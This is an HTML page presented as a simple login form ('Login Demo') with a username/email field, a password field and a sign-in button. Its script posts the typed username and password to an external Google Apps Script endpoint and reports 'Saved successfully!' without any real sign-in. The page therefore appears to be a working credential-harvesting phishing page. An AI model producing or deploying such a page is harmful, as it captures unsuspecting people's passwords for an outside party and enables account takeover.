<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Demo</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}
body{
    background:#fafafa;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.wrapper{
    width:350px;
}
.box{
    background:white;
    border:1px solid #ddd;
    padding:30px;
    text-align:center;
}
h1{
    margin-bottom:20px;
}
input{
    width:100%;
    padding:12px;
    margin-bottom:10px;
    border:1px solid #ccc;
    border-radius:4px;
}
button{
    width:100%;
    padding:12px;
    background:#0095f6;
    color:white;
    border:none;
    border-radius:4px;
    cursor:pointer;
}
button:disabled{
    opacity:0.5;
    cursor:not-allowed;
}
#status{
    margin-top:15px;
    font-size:14px;
}
</style>
</head>
<body>

<div class="wrapper">
    <div class="box">
        <h1>Login</h1>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Username / Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn" disabled>Sign In</button>
        </form>

        <p id="status"></p>
    </div>
</div>

<script>
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const loginForm = document.getElementById("loginForm");
const statusText = document.getElementById("status");

// Enable button when both fields have at least 1 character
function validateInputs() {
    if (
        usernameInput.value.trim() !== "" &&
        passwordInput.value !== ""
    ) {
        loginBtn.disabled = false;
    } else {
        loginBtn.disabled = true;
    }
}

usernameInput.addEventListener("input", validateInputs);
passwordInput.addEventListener("input", validateInputs);

loginForm.addEventListener("submit", async function(e){
    e.preventDefault();

    statusText.innerText = "Submitting...";

    const data = {
        username: usernameInput.value,
        password: passwordInput.value
    };

    try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbyec0EdVsbde-3mGD1_9URa_sv5dnfKt7R-Qlx0F8pgxHiSpdCZJ-8syLvAfd1zfTCp/exec", {
            method: "POST",
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if(result.status === "success"){
            statusText.innerText = "Saved successfully!";
            loginForm.reset();
            loginBtn.disabled = true;
        } else {
            statusText.innerText = "Submit failed";
        }
    } catch(error){
        console.log(error);
        statusText.innerText = "Server error";
    }
});
</script>

</body>
</html>
